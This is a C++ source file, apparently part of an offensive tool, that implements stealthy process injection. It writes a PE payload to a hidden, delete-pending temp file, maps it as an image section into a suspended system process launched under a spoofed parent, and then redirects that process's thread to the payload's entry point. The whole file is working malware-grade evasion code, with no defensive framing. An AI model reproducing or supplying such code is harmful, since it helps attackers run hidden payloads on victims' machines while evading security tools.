#include "utils/winapi.h"
#include "utils/random.h"

#define TEMP_FILE_LEN 8

BOOL CreateAndMapGhostSection(IN WinApiCustom *pWinApiCustom, IN LPVOID pPePayload, IN DWORD pePayloadSize, IN HANDLE hTargetProcess, OUT VOID **ppPePayloadInTargetBaseAddress)
{
    // Initialise
    BOOL isSuccess = FALSE;
    HANDLE hTempFile = NULL;
    DWORD bytesWritten = 0;
    HANDLE hFileMapping = NULL;
    CHAR tempFileName[TEMP_FILE_LEN + 1] = "";
    CHAR tempFilePath[MAX_PATH] = "";

    // Create temporary file
    if (pWinApiCustom->loadedFunctions.GetTempPath2A(MAX_PATH, tempFilePath) == 0)
        goto CLEANUP;

    RandomGenerator randomGenerator = RandomGenerator(pWinApiCustom);
    randomGenerator.GenerateRandomStr(TEMP_FILE_LEN, tempFileName);
    ConcatString(tempFilePath, tempFileName);

    // Open handle to it
    hTempFile = pWinApiCustom->loadedFunctions.CreateFileA(
        tempFilePath,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    if (hTempFile == NULL)
        goto CLEANUP;

    // Set file to be deleted
    FILE_DISPOSITION_INFO fileDispositionInfo;
    fileDispositionInfo.DeleteFile = TRUE;
    if (!pWinApiCustom->loadedFunctions.SetFileInformationByHandle(
            hTempFile,
            FILE_INFO_BY_HANDLE_CLASS::FileDispositionInfo,
            &fileDispositionInfo,
            sizeof(FILE_DISPOSITION_INFO)))
        goto CLEANUP;

    // Write PE payload to the file
    pWinApiCustom->loadedFunctions.WriteFile(
        hTempFile,
        pPePayload,
        pePayloadSize,
        &bytesWritten,
        NULL);
    if (bytesWritten != pePayloadSize)
        goto CLEANUP;
    if (!FlushFileBuffers(hTempFile))
        goto CLEANUP;

    // Create section backed by the file
    hFileMapping = pWinApiCustom->loadedFunctions.CreateFileMappingA(
        hTempFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL);
    if (hFileMapping == NULL)
        goto CLEANUP;

    // Close file handle
    pWinApiCustom->loadedFunctions.CloseHandle(hTempFile);

    // Map PE contents to target process
    *ppPePayloadInTargetBaseAddress = pWinApiCustom->loadedFunctions.MapViewOfFile3(
        hFileMapping,
        hTargetProcess,
        NULL,
        0,
        0,
        0,
        PAGE_READONLY,
        NULL,
        0);
    if (*ppPePayloadInTargetBaseAddress == NULL)
        goto CLEANUP;

    // If execution reaches here, all went well
    isSuccess = TRUE;

    // Cleanup
CLEANUP:
    if (hFileMapping != NULL)
        pWinApiCustom->loadedFunctions.CloseHandle(hFileMapping);

    //// Return success status
    return isSuccess;
}

BOOL HijackProcessExecution(WinApiCustom *pWinApiCustom, HANDLE hTargetProcess, HANDLE hTargetThread, LPVOID addressOfEntryPoint, LPVOID addressOfImageBase)
{
    // Get main thread context
    CONTEXT targetThreadContext;
    RtlZeroMemory(&targetThreadContext, sizeof(CONTEXT));
    targetThreadContext.ContextFlags = CONTEXT_ALL;
    if (!pWinApiCustom->loadedFunctions.GetThreadContext(hTargetThread, &targetThreadContext))
        return FALSE;

    // Patch PEB's BaseAddress
    PPEB_DETAILED pPeb = (PPEB_DETAILED)(targetThreadContext.Rdx);

    DWORD64 numOfBytesWrittenPatchPeb = 0;
    if (!pWinApiCustom->loadedFunctions.WriteProcessMemory(
            hTargetProcess,
            &(pPeb->ImageBaseAddress),
            &addressOfImageBase,
            sizeof(addressOfImageBase),
            &numOfBytesWrittenPatchPeb) ||
        numOfBytesWrittenPatchPeb != sizeof(LPVOID))
        return FALSE;

    // Patch RIP to point to Entry point
    targetThreadContext.Rip = (DWORD64)addressOfEntryPoint;
    if (!pWinApiCustom->loadedFunctions.SetThreadContext(hTargetThread, &targetThreadContext))
        return FALSE;

    // Resume process
    return (pWinApiCustom->loadedFunctions.ResumeThread(hTargetThread) == 1);
}

/*
pPePayload: Pointer to buffer containing PE payload
pePayloadSize: Size of above buffer
imagePath: Image path of the legitimate executable to launch
commandLineArgs: Command line args for the injected 
parentProcessId: PPID to use
createHidden: TRUE if process must be visually hidden
pProcessInformation: Pointer to a PROCESS_INFORMATION that receives output about newly created process
waitForProcessOutput: If TRUE, waits for process's output
ppProcessOutput: Double-pointer to a buffer that receives process output; requires waitForProcessOutput to be TRUE; requires to be manually freed
pProcessOutputSize: Pointer to DWORD that receives total size of data read; this value might be smaller than size of buffer pointed by ppProcessOutput
*/
BOOL WinApiCustom::InjectPERemote(IN LPVOID pPePayload, IN DWORD pePayloadSize, IN PCHAR imagePath, IN PCHAR commandLineArgs, IN DWORD parentProcessId, IN BOOL createHidden, OUT PPROCESS_INFORMATION pProcessInformation, BOOL waitForProcessOutput, OUT VOID **ppProcessOutput, OUT PDWORD pProcessOutputSize)
{
    // Initialise
    BOOL isSuccess = FALSE;
    HANDLE hStdoutRead = NULL;
    PCHAR system32Dir = NULL;
    LPVOID pPePayloadInTargetBaseAddress = NULL;

    // Create legitimate process in suspended mode
    this->GetSystem32Directory(&system32Dir);
    if (system32Dir == NULL)
        goto CLEANUP;

    if (!this->CreateNewProcessCustom(
            imagePath,
            commandLineArgs,
            parentProcessId,
            system32Dir,
            TRUE,
            createHidden,
            pProcessInformation,
            &hStdoutRead))
        goto CLEANUP;

    // Create ghost section containing PE payload and map to legit process
    CreateAndMapGhostSection(
        this,
        pPePayload,
        pePayloadSize,
        pProcessInformation->hProcess,
        &pPePayloadInTargetBaseAddress);
    if (pPePayloadInTargetBaseAddress == NULL)
        goto CLEANUP;

    // Hijack process's execution
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPePayload;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pPePayload + (pDosHeader->e_lfanew));
    DWORD pePayloadEntrypointOffset = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    if (pePayloadEntrypointOffset == 0)
        goto CLEANUP;

    if (!HijackProcessExecution(
            this,
            pProcessInformation->hProcess,
            pProcessInformation->hThread,
            (PBYTE)pPePayloadInTargetBaseAddress + pePayloadEntrypointOffset,
            pPePayloadInTargetBaseAddress))
        goto CLEANUP;

    // If process should be awaited
    if (waitForProcessOutput)
    {
        // Read output from process
        this->ReadOutputFromProcess(&hStdoutRead, ppProcessOutput, pProcessOutputSize);

        // Wait for process to finish
        this->loadedFunctions.WaitForSingleObject(pProcessInformation->hThread, INFINITE);
    }

    // If execution reaches here, all went well
    isSuccess = TRUE;

// Cleanup
CLEANUP:
    if (hStdoutRead != NULL)
        this->loadedFunctions.CloseHandle(hStdoutRead);

    if (pProcessInformation != NULL && pProcessInformation->hThread != NULL)
        this->loadedFunctions.CloseHandle(pProcessInformation->hThread);

    if (pProcessInformation != NULL && pProcessInformation->hProcess != NULL)
        this->loadedFunctions.CloseHandle(pProcessInformation->hProcess);

    if (system32Dir != NULL)
        this->HeapFreeCustom(system32Dir);

    return isSuccess;
}
